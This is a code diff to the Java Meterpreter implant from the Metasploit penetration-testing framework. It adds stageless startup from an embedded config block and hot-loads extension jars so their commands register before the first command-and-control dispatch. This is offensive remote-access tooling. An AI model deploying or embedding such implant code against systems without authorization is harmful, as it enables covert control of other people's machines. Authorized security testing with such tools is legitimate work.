@@ -3,6 +3,7 @@ package com.metasploit.meterpreter;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
+import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.OutputStream;
 import java.io.PrintStream;
@@ -43,21 +44,25 @@ public class Meterpreter {
     private byte[] uuid;
     private byte[] sessionGUID;
     private long sessionExpiry;
+    private JarFileClassLoader extensionLoader;
 
     protected void loadConfiguration(DataInputStream in, OutputStream rawOut, byte[] configBlock) throws MalformedURLException {
-        byte[] configHandle = new byte[8];
-        byte[] configPacket = new byte[configBlock.length - configHandle.length];
-
-        System.arraycopy(configBlock, 0, configHandle, 0, configHandle.length);
-        System.arraycopy(configBlock, configHandle.length, configPacket, 0, configPacket.length);
-
-        Config config = ConfigParser.parseConfig(configPacket);
+        Config config = ConfigParser.parseConfig(configBlock);
         if (config == null) {
             return;
         }
         this.sessionExpiry = config.session_expiry + System.currentTimeMillis();
         this.uuid = config.uuid;
         this.sessionGUID = config.session_guid;
+
+        if (config.debug_log != null && config.debug_log.length() > 0) {
+            try {
+                PrintStream debugStream = new PrintStream(new FileOutputStream(config.debug_log, true));
+                // System.setErr(debugStream);  // TEMP DEBUG: leave stderr on the console
+            } catch (IOException ignored) {
+                // failed to open log file; carry on without debug logging
+            }
+        }
 
         // here we need to loop through all the given transports, we know that we're
         // going to get at least one.
@@ -74,8 +79,15 @@ public class Meterpreter {
             this.transports.add(t);
         }
 
-        // we don't currently support extensions, so when we reach the end of the
-        // list of transports we just bomb out.
+        // Hot-load extensions baked into the config block (EXTENSIONS=) so
+        // their commands are registered before the first C2 dispatch.
+        for (byte[] extData : config.extensions) {
+            try {
+                loadExtension(extData);
+            } catch (Throwable t) {
+                t.printStackTrace(System.err);
+            }
+        }
     }
 
     public byte[] getUUID() {
@@ -166,6 +178,32 @@ public class Meterpreter {
 
             startExecuting();
         }
+    }
+
+    /**
+     * Initialize the meterpreter from an embedded config block. No upstream
+     * stream is consumed; transports open their own connections.
+     *
+     * @param configBlock    Raw TLV configuration bytes
+     * @param loadExtensions Whether to load extension jars
+     * @param redirectErrors Whether to redirect errors to the internal buffer
+     */
+    public Meterpreter(byte[] configBlock, boolean loadExtensions, boolean redirectErrors) throws Exception {
+        this.loadExtensions = loadExtensions;
+        this.commandManager = new CommandManager();
+        this.channels.add(null);
+
+        if (redirectErrors) {
+            errBuffer = new ByteArrayOutputStream();
+            err = new PrintStream(errBuffer);
+        } else {
+            errBuffer = null;
+            err = System.err;
+        }
+
+        loadConfiguration(null, null, configBlock);
+        this.ignoreBlocks = 0;
+        startExecuting();
     }
 
     public TransportList getTransports() {
@@ -301,7 +339,21 @@ public class Meterpreter {
     public Integer[] loadExtension(byte[] data) throws Exception {
         ClassLoader classLoader = getClass().getClassLoader();
         if (loadExtensions) {
-            JarFileClassLoader jarLoader = (JarFileClassLoader)classLoader;
+            // Staged payloads bootstrap us through a JarFileClassLoader so
+            // this.getClass().getClassLoader() is already one. The stageless
+            // jar runs under the JVM's AppClassLoader, so create our own
+            // JarFileClassLoader on first load and reuse it across calls so
+            // previously-loaded extensions stay reachable.
+            JarFileClassLoader jarLoader;
+            if (classLoader instanceof JarFileClassLoader) {
+                jarLoader = (JarFileClassLoader) classLoader;
+            } else {
+                if (extensionLoader == null) {
+                    extensionLoader = new JarFileClassLoader(classLoader);
+                }
+                jarLoader = extensionLoader;
+                classLoader = jarLoader;
+            }
             jarLoader.addJarFile(data);
         }
         JarInputStream jis = new JarInputStream(new ByteArrayInputStream(data));
